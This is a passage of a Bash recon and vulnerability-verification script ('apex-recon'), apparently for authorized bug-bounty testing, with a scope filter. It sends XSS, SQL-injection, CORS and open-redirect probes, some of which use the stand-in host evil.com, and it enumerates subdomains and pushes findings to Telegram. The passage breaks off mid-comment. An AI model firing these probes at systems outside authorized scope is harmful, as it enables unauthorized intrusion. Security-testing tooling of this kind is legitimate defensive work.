  e_url="$(hesc "$url")"; e_reason="$(hesc "$reason")"
  e_target="$(hesc "$TARGET")"

  if [[ -n "$poc_cmd" ]]; then
    e_poc="$(hesc "$poc_cmd")"
  else
    e_poc="curl -i -s \"${url}\""
  fi

  if [[ "$confidence" == "High" || "$confidence" == "Confirmed" ]]; then
    telegram "🚨 <b>CONFIRMED VULN ALERT</b>
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${e_target}</code>
💥 <b>Type:</b> ${e_type}
📊 <b>Confidence:</b> ${e_conf}
🔗 <b>URL:</b> <code>${e_url}</code>
📝 <b>Evidence:</b> ${e_reason}

📌 <b>Reproduce PoC</b>
<pre>${e_poc}</pre>
Confirm the response demonstrates <b>${e_type}</b>.${auth_note}

⏰ <i>$(date -u +%H:%M:%SZ)</i>" "HTML"
  else
    telegram "⚠️ <b>POTENTIAL FINDING (Manual Review Required)</b>
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${e_target}</code>
💥 <b>Type:</b> ${e_type}
📊 <b>Confidence:</b> ${e_conf}
🔗 <b>URL:</b> <code>${e_url}</code>
📝 <b>Reason:</b> ${e_reason}

📌 <b>Verification Command</b>
<pre>${e_poc}</pre>
Manual verification required.${auth_note}

⏰ <i>$(date -u +%H:%M:%SZ)</i>" "HTML"
  fi
}

# ============================================================================
# SQL Injection Global Regex & Log Parser Helper Functions
# ----------------------------------------------------------------------------
SQLI_NEGATIVE_REGEX='might not be injectable|not injectable|all tested parameters do not appear to be|heuristic \(basic\) test shows.*might not|no injection point|no parameter\(s\) found|no parameter\(s\) to test|testing connection|does not seem to be injectable|unable to connect|false positive|skipping to the next target|unable to find|no usable parameter|no injection detected'
SQLI_CONFIRM_ID_REGEX='identified the following injection point|is vulnerable'
SQLI_CONFIRM_PROOF_REGEX='Type: (Boolean-based blind|Time-based blind|Error-based|UNION query|inline query|stacked queries)|back-end DBMS:'
SQLI_POTENTIAL_REGEX='possible SQL injection|potential injection|heuristic positive|suspected injectable'

is_negative_sqli_log() {
  local log_f="$1"
  grep -qiE "$SQLI_NEGATIVE_REGEX" "$log_f" 2>/dev/null
}

is_confirmed_sqli_log() {
  local log_f="$1"
  # Rule 1: Rejection priority — if negative patterns exist, return non-zero (false)
  if is_negative_sqli_log "$log_f"; then
    return 1
  fi

  # Rule 2: Compute confirmation score across independent indicators
  local score=0
  grep -qiE 'identified the following injection point|is vulnerable' "$log_f" 2>/dev/null && score=$((score+1))
  grep -qiE 'Type: (Boolean-based blind|Time-based blind|Error-based|UNION query|inline query|stacked queries)' "$log_f" 2>/dev/null && score=$((score+1))
  grep -qiE 'back-end DBMS:' "$log_f" 2>/dev/null && score=$((score+1))

  # Require at least 2 independent confirmation indicators
  [[ "$score" -ge 2 ]]
}

format_takeover_jsonl_record() {
  local url="$1" scanner="$2" service="$3" cname="$4" confidence="$5" status="$6"
  
  if have jq; then
    jq -c -n \
      --arg url "$url" \
      --arg scanner "$scanner" \
      --arg service "$service" \
      --arg cname "$cname" \
      --argjson confidence "$confidence" \
      --arg status "$status" \
      --arg timestamp "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
      '{url:$url, scanner:$scanner, service:$service, cname:$cname, confidence:$confidence, status:$status, timestamp:$timestamp}' 2>/dev/null
  else
    printf '{"url":"%s","scanner":"%s","service":"%s","cname":"%s","confidence":%s,"status":"%s","timestamp":"%s"}\n' \
      "$(json_escape "$url")" \
      "$(json_escape "$scanner")" \
      "$(json_escape "$service")" \
      "$(json_escape "$cname")" \
      "$confidence" \
      "$(json_escape "$status")" \
      "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  fi
}

_normalize_url() {
  local u="$1" scheme host path query
  [[ -z "$u" ]] && return 0

  u="${u%%#*}" # remove fragment
  
  if [[ "$u" == *"://"* ]]; then
    scheme="${u%%://*}"
    u="${u#*://}"
  else
    scheme="http"
  fi

  host="${u%%/*}"
  if [[ "$u" == *"/"* ]]; then
    path="/${u#*/}"
  else
    path=""
  fi

  query=""
  if [[ "$path" == *"?"* ]]; then
    query="${path#*\?}"
    path="${path%%\?*}"
  fi

  # Lowercase host & strip default ports
  host="$(printf '%s' "$host" | tr '[:upper:]' '[:lower:]')"
  host="${host%:80}"
  host="${host%:443}"

  # Strip trailing slash
  [[ "$path" == *"/" ]] && path="${path%/}"

  # Sort query parameters alphabetically & remove tracking params
  if [[ -n "$query" ]]; then
    query=$(printf '%s\n' "$query" | tr '&' '\n' | grep -vE '^(utm_|gclid|fbclid|_ga|_hs)' | sort | tr '\n' '&')
    query="${query%&}"
  fi

  if [[ -n "$query" ]]; then
    printf '%s://%s%s?%s\n' "$scheme" "$host" "$path" "$query"
  else
    printf '%s://%s%s\n' "$scheme" "$host" "$path"
  fi
}
json_escape() {
  local s="$1"
  if have jq; then
    jq -R -s '.' <<< "$s" | sed -e 's/^"//' -e 's/"$//' | tr -d '\r\n'
  elif have python3; then
    python3 -c 'import json, sys; print(json.dumps(sys.stdin.read().rstrip("\r\n"))[1:-1])' <<< "$s" 2>/dev/null
  else
    s="${s//\\/\\\\}"
    s="${s//\"/\\\"}"
    s="${s//$'\t'/\\t}"
    s="${s//$'\n'/\\n}"
    s="${s//$'\r'/\\r}"
    printf '%s' "$s"
  fi
}

format_sqli_jsonl_record() {
  local url="$1" scanner="$2" param="$3" type="$4" dbms="$5" c_db="$6" c_usr="$7" corroborated="${8:-false}"
  
  if have jq; then
    jq -c -n \
      --arg url "$url" \
      --arg scanner "$scanner" \
      --arg parameter "$param" \
      --arg type "$type" \
      --arg dbms "$dbms" \
      --arg current_db "$c_db" \
      --arg current_user "$c_usr" \
      --arg confidence "confirmed" \
      --argjson corroborated "$corroborated" \
      --arg timestamp "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
      '{url:$url, scanner:$scanner, parameter:$parameter, type:$type, dbms:$dbms, current_db:$current_db, current_user:$current_user, confidence:$confidence, corroborated_by_nuclei:$corroborated, timestamp:$timestamp}' 2>/dev/null
  else
    printf '{"url":"%s","scanner":"%s","parameter":"%s","type":"%s","dbms":"%s","current_db":"%s","current_user":"%s","confidence":"confirmed","corroborated_by_nuclei":%s,"timestamp":"%s"}\n' \
      "$(json_escape "$url")" \
      "$(json_escape "$scanner")" \
      "$(json_escape "$param")" \
      "$(json_escape "$type")" \
      "$(json_escape "$dbms")" \
      "$(json_escape "$c_db")" \
      "$(json_escape "$c_usr")" \
      "$corroborated" \
      "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  fi
}

EXTRACTED_PARAM="unknown"
EXTRACTED_TYPE="unknown"
EXTRACTED_DBMS="unknown"
EXTRACTED_CURRENT_DB="N/A"
EXTRACTED_CURRENT_USER="N/A"

parse_sqli_log_fields() {
  local log_f="$1"
  EXTRACTED_PARAM=$(grep -iE 'Parameter: ' "$log_f" 2>/dev/null | head -n 1 | sed -E 's/.*[P|p]arameter:[[:space:]]*//' | tr -d '\r\n')
  EXTRACTED_TYPE=$(grep -iE 'Type: ' "$log_f" 2>/dev/null | head -n 1 | sed -E 's/.*[T|t]ype:[[:space:]]*//' | tr -d '\r\n')
  EXTRACTED_DBMS=$(grep -iE 'back-end DBMS:' "$log_f" 2>/dev/null | head -n 1 | sed -E 's/.*back-end DBMS:[[:space:]]*//' | tr -d '\r\n')
  EXTRACTED_CURRENT_DB=$(grep -iE 'current database:' "$log_f" 2>/dev/null | head -n 1 | sed -E 's/.*current database:[[:space:]]*//' | tr -d '\r\n')
  EXTRACTED_CURRENT_USER=$(grep -iE 'current user:' "$log_f" 2>/dev/null | head -n 1 | sed -E 's/.*current user:[[:space:]]*//' | tr -d '\r\n')

  EXTRACTED_PARAM="${EXTRACTED_PARAM:-unknown}"
  EXTRACTED_TYPE="${EXTRACTED_TYPE:-unknown}"
  EXTRACTED_DBMS="${EXTRACTED_DBMS:-unknown}"
  EXTRACTED_CURRENT_DB="${EXTRACTED_CURRENT_DB:-N/A}"
  EXTRACTED_CURRENT_USER="${EXTRACTED_CURRENT_USER:-N/A}"
}

update_sqli_jsonl_corroborated() {
  local jsonl_f="$1" target_norm_url="$2"
  [[ -s "$jsonl_f" ]] || return 0

  if have jq; then
    local tmp_j; tmp_j="$(mktemp)"
    jq --arg nurl "$target_norm_url" \
      'if ((.url | contains($nurl)) or ($nurl | contains(.url))) then .corroborated_by_nuclei = true else . end' \
      "$jsonl_f" > "$tmp_j" 2>/dev/null && mv "$tmp_j" "$jsonl_f"
  fi
}

VF_BODY=""; VF_HDRS=""; VF_STATUS=""
# Fetch without -f/-L. Body → $VF_BODY, response headers → $VF_HDRS, status → $VF_STATUS.
# IMPORTANT: call DIRECTLY (not inside $(...)) so the globals reach the caller's scope.
_vf_fetch() {
  local method="${1:-GET}" url="$2" ctype="${3:-}" data="${4:-}" origin="${5:-}"
  VF_BODY="$(mktemp 2>/dev/null || echo "/tmp/vf_body.$$")"
  VF_HDRS="$(mktemp 2>/dev/null || echo "/tmp/vf_hdrs.$$")"
  local args=(-s -o "$VF_BODY" -D "$VF_HDRS" -w '%{http_code}'
              --connect-timeout "${VF_CONNECT_TIMEOUT:-10}"
              --max-time "${VF_TIMEOUT:-15}" "${CURL_HDR[@]}")
  [[ "$method" == "POST" ]] && args+=(-X POST)
  [[ -n "$ctype"  ]] && args+=(-H "Content-Type: $ctype")
  [[ -n "$origin" ]] && args+=(-H "Origin: $origin")
  [[ -n "$data"   ]] && args+=(--data "$data")
  # Do not append a synthetic status inside command substitution: curl can
  # print a HTTP code and still exit non-zero (for example on a truncated body).
  # In that case "200000" would not match any verifier rule.
  if ! VF_STATUS="$(curl "${args[@]}" "$url" 2>/dev/null)"; then
    VF_STATUS="000"
  fi
  printf '%s\n' "$VF_STATUS"
}
_vf_cleanup() { [[ -n "$VF_BODY" ]] && rm -f "$VF_BODY"; [[ -n "$VF_HDRS" ]] && rm -f "$VF_HDRS"; VF_BODY=""; VF_HDRS=""; }
# Header value lookup (case-insensitive) from the last $VF_HDRS dump.
_vf_hdr() { grep -iE "^$1:" "$VF_HDRS" 2>/dev/null | tail -n1 | sed 's/^[^:]*:[[:space:]]*//' | tr -d '\r'; }
_vf_is_html() { head -c 400 "$1" 2>/dev/null | grep -qiE '<!doctype html|<html[ >]'; }

# 1. Exposed sensitive file: 200 + non-empty + not HTML/SPA + not a login bounce.
_verify_sensitive_file() {
  local url="$1" sig="${2:-}" st; _vf_fetch GET "$url" >/dev/null; st="$VF_STATUS"
  local v="NEEDS_MANUAL_REVIEW"
  if [[ "$st" == "200" && -s "$VF_BODY" && -n "$sig" ]] \
     && ! _vf_is_html "$VF_BODY" && grep -qF "$sig" "$VF_BODY"; then
    if grep -qiE 'sign[ -]?in|log[ -]?in|password|<form' "$VF_BODY" && [[ $(wc -c < "$VF_BODY") -lt 512 ]]; then
      v="NEEDS_MANUAL_REVIEW"
    else v="VERIFIED"; fi
  elif [[ "$st" =~ ^(301|302|303|307|308|401|403|404|000)$ ]] || _vf_is_html "$VF_BODY"; then
    v="FALSE_POSITIVE"
  fi
  _vf_cleanup; printf '%s\n' "$v"
}

# 2. Swagger/OpenAPI: 200 + valid JSON carrying an openapi/swagger version or a paths map.
_verify_swagger() {
  local url="$1" st; _vf_fetch GET "$url" >/dev/null; st="$VF_STATUS"
  local v="FALSE_POSITIVE"
  if [[ "$st" == "200" && -s "$VF_BODY" ]] && ! _vf_is_html "$VF_BODY"; then
    if jq -e '(.openapi? // .swagger?) or ((.paths // {}) | keys | length > 0)' "$VF_BODY" >/dev/null 2>&1; then
      v="VERIFIED"
    else v="NEEDS_MANUAL_REVIEW"; fi
  fi
  _vf_cleanup; printf '%s\n' "$v"
}

# 3. arjun hidden params: the results FILE must exist and hold ≥1 real http(s) URL.
_verify_arjun() {
  local f="$1"
  if [[ -s "$f" ]] && grep -qE '^https?://' "$f"; then printf 'VERIFIED\n'
  elif [[ -e "$f" ]]; then printf 'FALSE_POSITIVE\n'
  else printf 'NEEDS_MANUAL_REVIEW\n'; fi
}

# 4. GraphQL introspection ENABLED: 200 + JSON with a live __schema.
_verify_graphql() {
  local url="$1" st
  _vf_fetch POST "$url" 'application/json' '{"query":"query{__schema{queryType{name}}}"}' >/dev/null; st="$VF_STATUS"
  local v="FALSE_POSITIVE"
  if [[ "$st" == "200" ]] && jq -e '.data.__schema.queryType.name' "$VF_BODY" >/dev/null 2>&1; then
    v="VERIFIED"
  elif [[ ! "$st" =~ ^(200|400|401|403|000)$ ]]; then v="NEEDS_MANUAL_REVIEW"; fi
  _vf_cleanup; printf '%s\n' "$v"
}

# 5. CORS: origin reflected (never '*') + ACAC:true + 200 + non-trivial JSON body.
_verify_cors() {
  local url="$1" origin="${2:-https://apxr3c0n.evil.com}" st
  _vf_fetch GET "$url" '' '' "$origin" >/dev/null; st="$VF_STATUS"
  local acao acac ctype v="FALSE_POSITIVE"
  acao="$(_vf_hdr 'access-control-allow-origin')"
  acac="$(_vf_hdr 'access-control-allow-credentials')"
  ctype="$(_vf_hdr 'content-type')"
  if [[ "$st" == "200" && "$acao" == "$origin" && "$acao" != "*" \
        && "$acac" == "true" ]]; then
    local first; first="$(head -c1 "$VF_BODY" 2>/dev/null)"
    if [[ "$ctype" == *json* || "$first" == "{" || "$first" == "[" ]] \
       && [[ $(wc -c < "$VF_BODY") -gt 2 ]]; then v="VERIFIED"; fi
  fi
  _vf_cleanup; printf '%s\n' "$v"
}

# 6. Open redirect: response Location host must equal our attacker-controlled host.
_verify_redirect() {
  local url="$1" evil="${2:-evil.com}" st loc host
  _vf_fetch GET "$url" >/dev/null; st="$VF_STATUS"
  loc="$(_vf_hdr 'location')"
  local v="FALSE_POSITIVE"
  if [[ "$st" =~ ^(301|302|303|307|308)$ && -n "$loc" ]]; then
    host="$loc"; host="${host#*://}"; host="${host%%/*}"; host="${host#*@}"; host="${host%%:*}"
    if [[ "$host" == "$evil" || "$host" == *".$evil" ]]; then v="VERIFIED"
    else v="FALSE_POSITIVE"; fi
  fi
  _vf_cleanup; printf '%s\n' "$v"
}

# 7. Reflected XSS: raw markup "><x must survive UN-encoded in the body.
_verify_xss() {
  local url="$1" mark="apxr3c0n$$" st sep='?'
  [[ "$url" == *"?"* ]] && sep='&'
  _vf_fetch GET "${url}${sep}apxq=${mark}%22%3E%3Cx" >/dev/null; st="$VF_STATUS"
  local v="FALSE_POSITIVE"
  if [[ "$st" == "200" ]] && grep -qF "${mark}\"><x" "$VF_BODY"; then v="VERIFIED"; fi
  _vf_cleanup; printf '%s\n' "$v"
}

# 8. Error-based SQLi: appending a quote must surface a SQL error absent at baseline.
_verify_sqli() {
  local url="$1" sep='?' sqlre='SQL syntax|mysql_fetch|ORA-[0-9]|PostgreSQL.*ERROR|PG::|SQLSTATE|SQLite.*error|Unclosed quotation|ODBC.*Driver'
  [[ "$url" == *"?"* ]] && sep='&'
  _vf_fetch GET "${url}${sep}apxq=1" >/dev/null
  local base_hit=0; grep -qiE "$sqlre" "$VF_BODY" 2>/dev/null && base_hit=1; _vf_cleanup
  _vf_fetch GET "${url}${sep}apxq=1'\"" >/dev/null
  local v="FALSE_POSITIVE"
  if grep -qiE "$sqlre" "$VF_BODY" 2>/dev/null && [[ "$base_hit" -eq 0 ]]; then v="VERIFIED"; fi
  _vf_cleanup; printf '%s\n' "$v"
}

# 9. JS secret: pattern still live AND not a placeholder AND looks high-entropy.
_verify_js_secret() {
  local url="$1" secret="${2:-}" st; _vf_fetch GET "$url" >/dev/null; st="$VF_STATUS"
  local v="NEEDS_MANUAL_REVIEW"
  if [[ "$st" == "200" && -n "$secret" ]] && grep -qF "$secret" "$VF_BODY"; then
    if printf '%s' "$secret" | grep -qiE 'your[_-]?(api|key|token)|example|placeholder|xxxx+|<[a-z]|change[_-]?me|dummy|sample'; then
      v="FALSE_POSITIVE"
    elif [[ ${#secret} -ge 16 ]]; then v="VERIFIED"
    else v="NEEDS_MANUAL_REVIEW"; fi
  elif [[ "$st" == "200" && -n "$secret" ]]; then v="FALSE_POSITIVE"   # no longer present
  fi
  _vf_cleanup; printf '%s\n' "$v"
}

# 10. TLS: inherently manual; only a clearly EXPIRED cert auto-verifies.
_verify_tls() {
  local host="$1"; host="${host#*://}"; host="${host%%/*}"; host="${host%%:*}"
  if ! have openssl; then printf 'NEEDS_MANUAL_REVIEW\n'; return; fi
  local cert check_rc
  cert="$(printf '' | timeout "${VF_TIMEOUT:-15}" openssl s_client -connect "${host}:443" -servername "$host" 2>/dev/null)"
  if ! printf '%s' "$cert" | openssl x509 -noout >/dev/null 2>&1; then
    printf 'NEEDS_MANUAL_REVIEW\n'; return
  fi
  printf '%s' "$cert" | openssl x509 -noout -checkend 0 >/dev/null 2>&1
  check_rc=$?
  # x509 -checkend exits 1 when the certificate is already expired (or will
  # expire within the supplied interval, which is zero here).
  if [[ "$check_rc" -eq 1 ]]; then printf 'VERIFIED\n'
  else printf 'NEEDS_MANUAL_REVIEW\n'; fi
}

# Dispatcher: verify_finding <type> <arg1> [arg2] → echoes the verdict.
verify_finding() {
  local vtype="$1" a1="$2" a2="${3:-}"
  case "$vtype" in
    sensitive_file) _verify_sensitive_file "$a1" "$a2" ;;
    swagger)        _verify_swagger "$a1" ;;
    arjun)          _verify_arjun "$a1" ;;
    graphql)        _verify_graphql "$a1" ;;
    cors)           _verify_cors "$a1" "$a2" ;;
    redirect)       _verify_redirect "$a1" "$a2" ;;
    xss)            _verify_xss "$a1" ;;
    sqli)           _verify_sqli "$a1" ;;
    js_secret)      _verify_js_secret "$a1" "$a2" ;;
    tls)            _verify_tls "$a1" ;;
    *)              printf 'NEEDS_MANUAL_REVIEW\n' ;;
  esac
}

# Verify-gate for detector flows that need an independent re-check. Scanner-native
# confirmations (for example Dalfox's browser execution evidence) retain their
# own evidence-aware alert paths.
#   notify_verified <label> <url> <extra> <vtype> [arg2]
notify_verified() {
  local label="$1" url="$2" extra="$3" vtype="$4" arg2="${5:-}"
  local verdict
  verdict="$(verify_finding "$vtype" "$url" "$arg2" 2>/dev/null || echo NEEDS_MANUAL_REVIEW)"
  verdict="${verdict##*$'\n'}"   # keep only the final line, guard stray output
  VF_VERDICT="$verdict"
  case "$verdict" in
    VERIFIED)
      printf '%s\t%s\t%s\n' "$label" "$url" "$extra" >> "$OUT/validation/verified.txt"
      local custom_poc=""
      [[ "$vtype" == "cors" ]] && custom_poc="curl -i -s -H \"Origin: ${arg2}\" \"${url}\""
      [[ "$vtype" == "graphql" ]] && custom_poc="curl -i -s -X POST -H \"Content-Type: application/json\" --data '{\"query\":\"query{__schema{queryType{name}}}\"}' \"${url}\""
      [[ "$vtype" == "redirect" ]] && custom_poc="curl -i -s \"${url}\" | grep -i '^location:'"
      notify_alert "$label" "$url" "$extra — ✅ VERIFIED by engine" "$custom_poc" ;;
    FALSE_POSITIVE)
      printf '%s\t%s\t%s\n' "$label" "$url" "$extra" >> "$OUT/validation/false-positive.txt"
      warn "FP suppressed ($vtype): $label on $url" ;;
    *)
      printf '%s\t%s\t%s\n' "$label" "$url" "$extra" >> "$OUT/validation/needs-review.txt"
      warn "Needs manual review ($vtype): $label on $url" ;;
  esac
}

# Send detailed vulnerability findings to Telegram (HTML: bold header + monospace URLs)
telegram_findings() {
  local emoji="$1" label="$2" file="$3" max="${4:-10}"
  [[ -s "$file" ]] || return 0
  local total; total=$(wc -l < "$file" | tr -d ' ')
  local msg lines
  msg="$(printf '%s <b>%s</b> — <b>%s</b> finding(s)\n━━━━━━━━━━━━━━━━━━━━━━' "$emoji" "$(hesc "$label")" "$total")"
  lines="$(head -n "$max" "$file" | while IFS= read -r l; do [[ -z "$l" ]] && continue; printf '• <code>%s</code>\n' "$(hesc "$l")"; done)"
  msg="$msg
$lines"
  [[ "$total" -gt "$max" ]] && msg="$msg
… <i>and $((total - max)) more</i>"
  printf '%s\n\n' "$msg"
}

# Scope-aware filter for hostnames and URLs. SCOPE_FILE may contain one
# authorized root domain or wildcard domain per line (for example *.example.com).
in_scope() {
  awk -v primary="$TARGET" -v scope_file="$SCOPE_FILE" '
    function add_scope(v) { gsub(/^[[:space:]]+|[[:space:]]+$/, "", v); sub(/^\*\./, "", v); if (v != "" && v !~ /^#/) allowed[tolower(v)] = 1 }
    # A supplied scope file is a restriction, never an addition to TARGET.
    # Without one, scanning is limited to TARGET and its subdomains.
    BEGIN {
      if (scope_file != "") while ((getline line < scope_file) > 0) add_scope(line)
      else add_scope(primary)
    }
    {
      host=$0; sub(/^[a-zA-Z][a-zA-Z0-9+.-]*:\/\//, "", host); sub(/^.*@/, "", host); sub(/[\/?#].*$/, "", host); sub(/:[0-9]+$/, "", host); host=tolower(host)
      for (root in allowed) if (host == root || (length(host) > length(root) && substr(host, length(host)-length(root), 1) == "." && substr(host, length(host)-length(root)+1) == root)) { print; next }
    }'
}

MISSING_CORE=()
for t in subfinder dnsx httpx katana gau nuclei curl jq; do have "$t" || MISSING_CORE+=("$t"); done
if [[ ${#MISSING_CORE[@]} -gt 0 ]]; then
  die "Missing required tools: ${MISSING_CORE[*]}
  Fix once:   ./setup.sh              (installs everything)
  See status: ./apex-recon.sh --check
  Or use Docker (see README) - everything preinstalled, runs on any Linux."
fi

if [[ ! -s "$RESOLVERS" ]]; then
  printf '1.1.1.1\n8.8.8.8\n9.9.9.9\n8.8.4.4\n1.0.0.1\n' > "$RESOLVERS"
fi

if [[ -n "$SCOPE_FILE" && ! -s "$SCOPE_FILE" ]]; then
  die "SCOPE_FILE is set but cannot be read or is empty: $SCOPE_FILE"
fi
if [[ -n "$SCOPE_FILE" ]] && ! printf '%s\n' "$TARGET" | in_scope | grep -qxF "$TARGET"; then
  die "Target is outside SCOPE_FILE: $TARGET"
fi
[[ -n "$SCOPE_FILE" ]] && log "Using authorized scope file: $SCOPE_FILE"

telegram "🔎 apex-recon started
Target: ${TARGET}
Mode: ${MODE} | active-brute: ${ACTIVE_BRUTE}
Time: ${STAMP}"

###############################################################################
# 1. Subdomain enumeration & ASN/CIDR Discovery
###############################################################################
if ! is_step_done 1; then
  log "Subdomain & ASN Enumeration (subfinder, assetfinder, amass, github-subdomains, crt.sh, chaos, mapcidr)"
  : > "$OUT/subs/raw.txt"

  need subfinder
  # Per-tool timing: subdomain coverage (-all) is intentionally kept, but each
  # source tool is now timed so you can SEE which one is slow. Historically the
  # long tail (the "400 minutes") comes from amass/puredns, NOT subfinder — this
  # makes that visible instead of looking like a single silent hang.
  # -timeout caps how long subfinder waits on any single source; -max-time caps
  # the overall subfinder run. Tunable via SUBFINDER_TIMEOUT / SUBFINDER_MAXTIME.
  _t=$SECONDS
  log "  ↳ subfinder running…"
  subfinder -d "$TARGET" -all -silent \
    -timeout "${SUBFINDER_TIMEOUT:-20}" \
    -max-time "${SUBFINDER_MAXTIME:-8}" \
    -o "$OUT/subs/subfinder.txt" || true
  cat "$OUT/subs/subfinder.txt" >> "$OUT/subs/raw.txt"
  log "  ↳ subfinder: $(count "$OUT/subs/subfinder.txt") subs in $((SECONDS-_t))s"

  if have assetfinder; then
    _t=$SECONDS
    log "  ↳ assetfinder running…"
    assetfinder --subs-only "$TARGET" > "$OUT/subs/assetfinder.txt" 2>/dev/null || true
    cat "$OUT/subs/assetfinder.txt" >> "$OUT/subs/raw.txt"
    log "  ↳ assetfinder: $(count "$OUT/subs/assetfinder.txt") subs in $((SECONDS-_t))s"
  fi

  if have amass && [[ "$MODE" == "full" ]]; then
    # amass can DEADLOCK (futex_do_wait, "Sleeping", ~1% CPU) and then IGNORE its
    # own -timeout, running for 15+ hours — this was the real cause of your
    # multi-hundred-minute "hang". Fix = EXTERNAL OS watchdog: coreutils `timeout`
    # kills amass from the outside regardless of its internal state, with
    # --kill-after forcing SIGKILL if it ignores SIGTERM. `amass -timeout` is kept
    # as a first polite attempt. AMASS_TIMEOUT is in MINUTES; AMASS_TIMEOUT=0
    # disables amass entirely (recommended on Termux if it keeps stalling —
    # subfinder + crt.sh already give strong coverage).
    _t=$SECONDS
    _amass_to="${AMASS_TIMEOUT:-15}"
    if [[ "$_amass_to" == "0" ]]; then
      warn "  ↳ amass skipped (AMASS_TIMEOUT=0)"
    else
      log "  ↳ amass running (passive; watchdog ${_amass_to}m)…"
      if have timeout; then
        timeout --kill-after=30s "${_amass_to}m" \
          amass enum -passive -d "$TARGET" -timeout "$_amass_to" -silent -o "$OUT/subs/amass.txt" 2>/dev/null
        _rc=$?
        { [[ "$_rc" == "124" || "$_rc" == "137" ]] && warn "  ↳ amass hit ${_amass_to}m watchdog, force-killed (partial results kept)"; } || true
      else
        warn "  ↳ 'timeout' not found — amass runs without external watchdog (may hang); install coreutils"
        amass enum -passive -d "$TARGET" -timeout "$_amass_to" -silent -o "$OUT/subs/amass.txt" 2>/dev/null || true
      fi
      cat "$OUT/subs/amass.txt" >> "$OUT/subs/raw.txt" 2>/dev/null || true
      log "  ↳ amass: $(count "$OUT/subs/amass.txt") subs in $((SECONDS-_t))s (watchdog ${_amass_to}m; AMASS_TIMEOUT=0 disables)"

      # amass intel can hang the same way → its own (shorter) external watchdog.
      if have timeout; then
        timeout --kill-after=20s "${AMASS_INTEL_TIMEOUT:-5}m" \
          amass intel -d "$TARGET" -whois -silent -o "$OUT/subs/amass-intel.txt" 2>/dev/null || true
      else
        amass intel -d "$TARGET" -whois -silent -o "$OUT/subs/amass-intel.txt" 2>/dev/null || true
      fi
    fi
  fi

  if have github-subdomains && [[ -n "${GITHUB_TOKEN:-}" ]]; then
    _t=$SECONDS
    log "  ↳ github-subdomains running…"
    github-subdomains -d "$TARGET" -t "$GITHUB_TOKEN" -o "$OUT/subs/github.txt" 2>/dev/null || true
    cat "$OUT/subs/github.txt" >> "$OUT/subs/raw.txt"
    log "  ↳ github-subdomains: $(count "$OUT/subs/github.txt") subs in $((SECONDS-_t))s"
  fi

  # --- crt.sh (Certificate Transparency) — FREE, no API key, one HTTP call ----
  # CT logs routinely reveal subdomains that passive-DNS sources miss. This adds
  # coverage with zero keys — exactly the "more subdomains" you asked for. Bounded
  # by CRTSH_TIMEOUT so a slow crt.sh can't stall the run.
  if have curl && have jq; then
    _t=$SECONDS
    log "  ↳ crt.sh running…"
    _tesc="${TARGET//./\\.}"
    curl -fsS --max-time "${CRTSH_TIMEOUT:-40}" \
      "https://crt.sh/?q=%25.${TARGET}&output=json" 2>/dev/null \
      | jq -r '.[].name_value' 2>/dev/null \
      | sed 's/^\*\.//; s/^\.//' \
      | grep -iE "(^|\.)${_tesc}\$" \
      | tr 'A-Z' 'a-z' | sort -u > "$OUT/subs/crtsh.txt" || true
    cat "$OUT/subs/crtsh.txt" >> "$OUT/subs/raw.txt" 2>/dev/null || true
    log "  ↳ crt.sh: $(count "$OUT/subs/crtsh.txt") subs in $((SECONDS-_t))s"
  fi

  # --- chaos (ProjectDiscovery public DNS dataset) — needs a free CHAOS_KEY ----
  # Get a key at https://cloud.projectdiscovery.io ; export CHAOS_KEY=... to use.
  if have chaos && [[ -n "${CHAOS_KEY:-}" ]]; then
    _t=$SECONDS
    log "  ↳ chaos running…"
    PDCP_API_KEY="$CHAOS_KEY" chaos -d "$TARGET" -silent -o "$OUT/subs/chaos.txt" 2>/dev/null \
      || chaos -d "$TARGET" -key "$CHAOS_KEY" -silent -o "$OUT/subs/chaos.txt" 2>/dev/null || true
    cat "$OUT/subs/chaos.txt" >> "$OUT/subs/raw.txt" 2>/dev/null || true
    log "  ↳ chaos: $(count "$OUT/subs/chaos.txt") subs in $((SECONDS-_t))s"
  fi

  # ASN IP Range mapping with mapcidr if available
  if have mapcidr && [[ -s "$OUT/subs/amass-intel.txt" ]]; then
    mapcidr -cl "$OUT/subs/amass-intel.txt" -silent -o "$OUT/subs/cidrs.txt" 2>/dev/null || true
  fi

  cat "$OUT"/subs/*.txt 2>/dev/null | sed 's/^\*\.//;s/^\.//' | in_scope | awk 'NF && !seen[$0]++' > "$OUT/subs/all.txt"
  log "Subdomains enumerated: $(count "$OUT/subs/all.txt")"
  set_checkpoint 1
fi
telegram "🔍 <b>STEP 1/34 · Subdomain Enumeration</b> ✅
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${TARGET}</code>
📊 <b>Subdomains Found:</b> $(count "$OUT/subs/all.txt")
⏱ <b>Elapsed:</b> $(get_elapsed)" "HTML"

# Storage saver: subs/raw.txt is the pre-dedup concatenation of every source;
# subs/all.txt (the deduped result) is what later stages use. Drop the raw dump.
prune_paths "$OUT/subs/raw.txt"

###############################################################################
# 2. DNS resolution + permutation
###############################################################################
if ! is_step_done 2; then
  log "DNS resolution (dnsx)"
  need dnsx
  _t=$SECONDS
  log "  ↳ dnsx resolving $(count "$OUT/subs/all.txt") candidate(s)…"

  if [[ -s "$RESOLVERS" ]]; then
    dnsx -l "$OUT/subs/all.txt" -r "$RESOLVERS" -silent -o "$OUT/dns/resolved.txt" || true
  else
    dnsx -l "$OUT/subs/all.txt" -silent -o "$OUT/dns/resolved.txt" || true
  fi
  log "  ↳ dnsx: $(count "$OUT/dns/resolved.txt") resolved in $((SECONDS-_t))s"

  if [[ "$ACTIVE_BRUTE" == "true" ]] && [[ -s "$WORDLIST_DNS" ]]; then
    log "Active DNS brute force / permutations (alterx + dnsx/puredns)"
    if have alterx; then
      _t=$SECONDS
      log "  ↳ alterx + dnsx permutation brute running…"
      alterx -l "$OUT/subs/all.txt" -silent | dnsx -silent -o "$OUT/dns/alterx_resolved.txt" || true
      cat "$OUT/dns/alterx_resolved.txt" >> "$OUT/dns/resolved.txt"
      log "  ↳ alterx permutations: $(count "$OUT/dns/alterx_resolved.txt") new in $((SECONDS-_t))s"
    fi
    if have puredns; then
      # puredns bruteforce is by far the slowest subdomain step (a full DNS
      # wordlist = millions of queries). External `timeout` watchdog so it can
